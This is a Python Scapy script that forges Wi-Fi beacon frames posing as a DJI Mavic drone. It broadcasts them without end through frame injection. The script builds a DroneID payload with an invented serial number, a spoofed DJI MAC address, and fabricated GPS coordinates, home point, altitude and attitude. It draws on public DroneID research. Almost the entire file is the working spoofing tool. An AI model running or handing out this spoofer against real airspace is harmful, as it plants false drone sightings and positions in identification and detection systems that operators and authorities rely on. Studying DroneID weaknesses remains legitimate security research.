#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#
# source: https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
# https://github.com/kismetwireless/kismet/tree/master/dot11_parsers
# https://department13.com/dev/wp-content/uploads/2018/02/Anatomy-of-DJI-Drone-ID-Implementation1.pdf
# https://github.com/MrJabu/ESP8266_DJI_DroneID_Throwie/blob/master/ESP8266_DJI_DroneID_Throwie.ino
# https://pastebin.com/m5bD1zyS

# https://bitbucket.org/secdev/scapy-com/pull-requests/5/complete-set-of-80211-ie-tags/diff

# requires:
#     radiotap supported wifi nic/driver (frame injection) (works fine with Ralink RT2571W)
#     iwconfig $iface mode monitor
#     iw dev $iface set channel $channel
#       or
#     iwlist iface scan
#  
# example:
#    spawn 1000 essids (0-999)
#    #> python fakebeacon.py $(python -c "print ' '.join(i for i in xrange(1000))")
#
from scapy.all import *
import sys
import random
import os
import math
import struct
import binascii

def floatToReversedIntArray(floatvalue):
    radiansint=int(math.radians(floatvalue)*10000000)
    print(radiansint)
    char1 = (radiansint>>24) & 0xff
    char2 = (radiansint>>16) & 0xff
    char3 = (radiansint>>8) & 0xff
    char4 = radiansint & 0xff
    array=[char4,char3,char2,char1]
    return array

def hexArrayToFloat(hexArray):
    floatValue=0
    floatValue=int(hexArray[3])<<24
    floatValue=floatValue+(int(hexArray[2])<<16)
    floatValue=floatValue+(int(hexArray[1])<<8)	
    floatValue=floatValue+int(hexArray[0])
    floatValue=math.degrees(floatValue/10000000)
    return floatValue


def main():
    
    #-----------------------------------try to encode longitude
    longitude=113.963371
    latitude=22.54201
    longitude_home=113.952271
    latitude_home=22.5370
	
    serialnum = '0ASDE4R0B10153'
    ssid="Mavic-"+serialnum
    randomMACPrefix='60:60:1f'
    randomMACPostfix=str(RandMAC())[8:]
    djiMAC=randomMACPrefix+randomMACPostfix	
    iface = sys.argv[1]         #Interface name here

    print('MAC-Adres: '+djiMAC)
    print('SSID: '+ssid)
	
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=djiMAC, addr3=djiMAC)
    beacon = Dot11Beacon(cap='short-slot+ESS+privacy+short-preamble')
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
    rates=Dot11Elt(ID='Rates',info='\x82\x84\x8b\x0c\x12\x96\x18\x24')  #supported rates
    dsset=Dot11Elt(ID='DSset',info=chr(11))  #current channel '\x0b'
    tim=Dot11Elt(ID='TIM',info='\x00\x01\x00\x00')  #traffic indication map
    country=Dot11Elt(ID=7,info='US'+'\x00\x01\x0b,\x1e') #country information \x55\x53=US
    erpinfo=Dot11Elt(ID='ERPinfo',info='0x00')  #erp information
    esrates=Dot11Elt(ID='ESRates',info='\x30\x48\x60\x6c') #extended supported rates
    htcap=Dot11Elt(ID=45,info='\xac\x01\x02\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')  #HT Capabilities
    htinfo=Dot11Elt(ID=61,info='\x0b\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00') #HT Information		
    rsn = Dot11Elt(ID='RSNinfo', info='\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x0c\x00') #RSN Information	        	          
    vendorsp = Dot11Elt(ID='vendor', info='\x00\x50\xf2\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')   #Vendor Specific: Microsoft WMM/WME Paramater Element
    droneid='\x26\x37\x12\x58\x62\x13\x10\x01\x5a\x00\xd7\x0f' #header
    droneid+='\x00\x00'+serialnum  #serialnumber 16bytes long leading \x00 -> 'DroneID is crap?'
    array=floatToReversedIntArray(longitude)
    droneid+=chr(array[0])+chr(array[1])+chr(array[2])+chr(array[3]) #longitude (backwards) '\xb0\x78\x5b\x00'
    array=floatToReversedIntArray(latitude)
    droneid+=chr(array[0])+chr(array[1])+chr(array[2])+chr(array[3]) #latitude (backwards) '\x29\xeb\xc2\xfe'
    droneid+=chr(250)+'\x00' #altitude
    droneid+=chr(27)+'\x00' #height
    droneid+=chr(216)+'\x00' #v_north
    droneid+=chr(171)+'\x00' #v_east
    droneid+=chr(59)+'\x00' #v_up
    droneid+=chr(192)+'\x00' #pitch
    droneid+=chr(244)+'\x00' #roll
    droneid+=chr(64)+'\x00' #yaw
    array=floatToReversedIntArray(longitude_home)
    droneid+=chr(array[0])+chr(array[1])+chr(array[2])+chr(array[3]) #longitude_home (backwards) '\x0c\x05\x3c\x00'
    array=floatToReversedIntArray(latitude_home)
    droneid+=chr(array[0])+chr(array[1])+chr(array[2])+chr(array[3]) #latitude_home (backwards) '\x30\x79\x2f\x01'
    droneid+='\x10' #product_type
    droneid+='\x06' #uuid length
    droneid+='\x31\x39\x35\x37\x34\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' #uid
    vendordrone = Dot11Elt(ID='vendor', info=droneid)   #fixedDroneID

    frame = RadioTap()/dot11/beacon/essid/rates/dsset/tim/country/erpinfo/esrates/htcap/htinfo/rsn/vendorsp/vendordrone
	
    #frame.show()
    print("\nHexDump of frame:")
    #hexdump(frame)

    sendp(frame, iface=iface, inter=0.100, loop=1)
    
if __name__=="__main__":
    main()
